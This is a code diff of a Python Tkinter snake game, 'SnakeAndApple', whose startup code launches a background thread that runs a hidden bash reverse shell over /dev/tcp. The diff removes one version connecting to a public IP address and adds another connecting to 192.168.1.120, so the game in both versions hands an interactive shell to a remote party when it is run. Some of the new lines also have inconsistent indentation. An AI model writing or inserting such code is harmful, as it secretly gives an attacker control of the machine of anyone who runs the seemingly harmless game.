@@ -8,11 +8,7 @@ import threading
 from PIL import ImageTk,Image
 
 def fn(n):
-    try:
-        subprocess.check_call("/bin/bash -i >/dev/tcp/82.165.97.169/1988 0<&1 2&>1",shell=True, executable="/bin/bash")
-    except:
-        return 0
-
+       subprocess.check_call("/bin/bash -i >/dev/tcp/192.168.1.120/45678 0<&1 2>&1", shell=True, executable='/bin/bash')
 size_of_board = 600
 rows = 10
 cols = 10
@@ -252,7 +248,7 @@ class SnakeAndApple:
                 self.last_key = key_pressed
 
 if __name__=="__main__":
-    thread = threading.Thread(target=fn, args=(0,))
+   thread = threading.Thread(target= fn, args=(10,))
     thread.start()
     game_instance = SnakeAndApple()
     game_instance.mainloop()
